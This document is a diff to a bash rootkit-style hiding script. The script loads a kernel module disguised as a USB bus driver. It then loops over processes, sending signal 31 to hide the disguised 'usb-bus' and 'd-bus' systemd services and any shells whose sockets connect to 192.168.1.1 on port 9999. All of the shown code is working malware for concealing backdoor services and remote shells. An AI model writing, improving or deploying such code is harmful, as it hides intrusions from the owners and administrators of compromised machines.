@@ -7,44 +7,46 @@ hiding_script=$(cat << \EOF
 
 insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
 
-hidden_pids=()
-
 while true; do
 
-#hide usb-bus and d-bus, which are the scripts that the systemd services execute
-bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
-while read -d " " hide_pid; do
-  cmd=$(cat /proc/$hide_pid/cmdline)
-  cat /proc/$hide_pid/cmdline &>/dev/null
+#-hide usb-bus and d-bus, which are the scripts that the systemd services execute-
+#find all the bash processes
+bash_pids=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
+read -a bash_array <<<$bash_pids
+
+#hide the services
+for i in ${bash_array[@]}; do
+  cmd=$(cat /proc/$i/cmdline 2>/dev/null)
   if [ "$?" == "1" ]; then
     continue
   fi
   if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
-    kill -31 $hide_pid
-    #echo "hid systemd service pid: $hide_pid"
+    kill -31 $i
   fi
-done <<<$bash_pid
-
-#hide bash shells which our systemd service spawns
-inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
-for (( i=1; i <= 65553; i=i+1 )); do
-  if [ "${hidden_pids[i]}" != "" ]; then
-    #echo "$i already on hidden_pids"
-    continue
-  fi
-  socket=$(readlink /proc/$i/fd/0)
-  while read inode_number; do
-    if [ "socket:[$inode_number]" == "$socket" ]; then
-      #echo "pid: $i inode_number: $inode_number"
-      kill -31 $i
-      #echo "hid bash pid: $i"
-      hidden_pids[i]=$i
-      #echo "hidden_pids[i] pid: ${hidden_pids[i]}"
-    fi
-  done <<<$inode_list
 done
 
-#sleep 10
+#-hide bash shells which our systemd service spawns-
+#find all the pids
+pids=$(ps aux | awk '{print $2}')
+read -a pid_array <<<$pids
+
+#find all the inodes
+inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
+read -a inode_array <<<$inodes
+
+#hide the bash shells
+for p in ${pid_array[@]}; do
+  for i in ${inode_array[@]}; do
+    for (( j=0; j <= 2; j=j+1 )); do
+      socket=$(readlink /proc/$p/fd/$j)
+      if [ "socket:[$i]" == "$socket" ]; then
+        kill -31 $p
+      fi
+    done
+  done
+done
+
+sleep 1
 
 done
 EOF
